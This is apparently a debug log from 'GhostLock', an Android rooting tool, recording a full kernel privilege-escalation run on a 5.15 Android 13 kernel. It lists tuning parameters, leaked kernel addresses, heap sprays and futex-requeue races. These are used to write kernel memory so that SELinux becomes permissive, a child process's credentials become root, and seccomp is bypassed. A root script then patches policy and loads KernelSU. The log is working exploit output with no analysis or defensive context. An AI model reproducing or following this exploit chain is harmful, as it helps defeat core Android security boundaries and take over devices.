debug log: Download/GhostLock/20260922-113448/ghostlock-direct-0.log
debug dump dir: /storage/emulated/0/Download/GhostLock/20260922-113448
ksud ready
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[33m[*] [0mroot script written path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh bytes=6190
[33m[*] [0miomem cache: direct_map_end=ffffff8a80000000
[32m[+] [0mstartup context pid=13272 uid=10510 euid=10510 gid=10510 egid=10510 boot_ms=400126 attr=u:r:untrusted_app:s0:c254,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=13272 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=13272 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=13272 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+1ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+202ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +224ms
[33m[*] [0m[spray] finding futex collisions... +473ms
[33m[*] [0m[spray] early collision screen 11/7 at 31%
[33m[*] [0m[spray] futex collisions found +1503ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8814d75800 +1550ms
[33m[*] [0m[spray] payload ready +1555ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +1724ms
[33m[*] [0m[T+1929ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+3939ms]   PI route done
[32m[+] [0mSELinux permissive
[33m[*] [0mW1b: private scratch repair attempt 1/3
[33m[*] [0m=== W1b: private scratch repair === target=0xffffff8814d70108 mode=1 leaf=1
[33m[*] [0m[T+4044ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +249ms
[33m[*] [0m[spray] finding futex collisions... +502ms
[33m[*] [0m[spray] early collision screen 7/7 at 34%
[33m[*] [0m[spray] futex collisions found +1570ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff880b506400 +1607ms
[33m[*] [0m[spray] payload ready +1614ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +1793ms
[33m[*] [0m[T+5852ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+7860ms]   PI route done
[32m[+] [0mprivate scratch repaired; releasing quarantine
[33m[*] [0m[T+7866ms] Write 1 complete
[33m[*] [0m[T+8081ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff802c372400 (170/256 votes)
[33m[*] [0mperf task: 0xffffff802c372400 (187/256 votes)
[33m[*] [0m[T+8982ms] perf_find_task done
[33m[*] [0mchild_pid=18689 child_task=0xffffff802c372400
[33m[*] [0mvr.ko not loaded; skipping tag clear
[33m[*] [0mW2: cred attempt 1/15
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +239ms
[33m[*] [0m[spray] finding futex collisions... +495ms
[33m[*] [0m[spray] early collision screen 13/7 at 31%
[33m[*] [0m[spray] futex collisions found +1603ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff880b62e400 +1636ms
[33m[*] [0m[spray] payload ready +1641ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +1811ms
[33m[*] [0mW2 fast repair payload prebuilt
[33m[*] [0m=== W2: cred === target=0xffffff802c372b98 mode=2 leaf=0
[33m[*] [0m[T+11006ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +254ms
[33m[*] [0m[spray] finding futex collisions... +521ms
[33m[*] [0m[spray] early collision screen 15/7 at 31%
[33m[*] [0m[spray] futex collisions found +1573ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8818dfb400 +1605ms
[33m[*] [0m[spray] payload ready +1610ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +1785ms
[33m[*] [0m[T+12800ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+14810ms]   PI route done
[33m[*] [0mW2b: firing prebuilt init_cred+8 repair
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0mchild uid = 0
[32m[+] [0mchild is root!
[33m[*] [0mW3-0: leaf dir attempt 1/4
[33m[*] [0m=== W3-0: leaf dir === target=0xffffff802c372ba8 mode=1 leaf=1
[33m[*] [0m[T+16168ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +239ms
[33m[*] [0m[spray] finding futex collisions... +498ms
[33m[*] [0m[spray] early collision screen 9/7 at 31%
[33m[*] [0m[spray] futex collisions found +1526ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff881bf86000 +1574ms
[33m[*] [0m[spray] payload ready +1579ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +1746ms
[33m[*] [0m[T+17919ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+19926ms]   PI route done
[33m[*] [0mleaf dir probe comm_len=0 comm[0]=00
[33m[*] [0mleaf=1 write lands on [target]
[33m[*] [0mW3: TIF_SECCOMP+mode attempt 1/6
[33m[*] [0m=== W3: TIF_SECCOMP === target=0xffffff802c372400 mode=1 leaf=1
[33m[*] [0m[T+20198ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +235ms
[33m[*] [0m[spray] finding futex collisions... +497ms
[33m[*] [0m[spray] early collision screen 9/7 at 31%
[33m[*] [0m[spray] futex collisions found +1531ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff880aab4c00 +1571ms
[33m[*] [0m[spray] payload ready +1574ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +1749ms
[33m[*] [0m[T+21951ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+23960ms]   PI route done
[33m[*] [0m=== W3: seccomp mode === target=0xffffff802c372c60 mode=1 leaf=1
[33m[*] [0m[T+24021ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +248ms
[33m[*] [0m[spray] finding futex collisions... +507ms
[33m[*] [0m[spray] early collision screen 8/7 at 31%
[33m[*] [0m[spray] futex collisions found +1537ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88161c7c00 +1573ms
[33m[*] [0m[spray] payload ready +1579ms
[33m[*] [0mprepare_kernel_page ok attempt=1 +1753ms
[33m[*] [0m[T+25778ms]   heap spray done
[33m[*] [0m[route] creating waiter/owner/consumer
[33m[*] [0mconsumer thread running on cpu=1
[33m[*] [0m[route] waiter parked; owner started
[33m[*] [0m[route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[33m[*] [0mmulticast route status=0 clean=1/1 step=0 errno=0
[33m[*] [0mmcast ghost disarm ret=-1 errno=110
[33m[*] [0m[route] route_done status=0 clean=1/1 step=0 errno=0 calls=1 success=1
[33m[*] [0m[route] threads joined
[33m[*] [0m[T+27788ms]   PI route done
[33m[*] [0mseccomp finit_module probe = 0x16
[32m[+] [0mchild seccomp filter bypassed (finit_module errno=22)
[32m[+] [0mchild seccomp fully bypassed (forked workers run filter-free)
[33m[*] [0m[T+29847ms] exploit complete
[33m[*] [0mhandoff: child=18689 alive=1 sent=1 errno=0
[33m[*] [0mhandoff: root script path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mhandoff: root shell worker pid=31997
[33m[*] [0mhandoff: script open fd=3 errno=0 path=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[*] root script start uid=0 euid=0
[*] seccomp=Seccomp:	0 Seccomp_filters:	0 
[*] ksud=/data/user/0/com.ghostlock.app/files/ksud
[*] ksud_file=-rwx------ 1 u0_a510 u0_a510 4892712 2026-09-22 11:34 /data/user/0/com.ghostlock.app/files/ksud
[*] uname=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[*] iomem cache: cached 12860 bytes
[*] fixup: attempt 1
1+0 records in
1+0 records out
1 bytes (1 B) copied, 0.015 s, 66 B/s
[*] policyload before=0 after=2
[*] policy fixup rc=0
[*] late-load kmi=android13-5.15
[*] late-load exit=0
[*] temp su uid=0; watching kernelsu.ko
[+] KernelSU module loaded
[33m[*] [0menforce=1 (enforcing)
[32m[+] [0mKernelSU ready
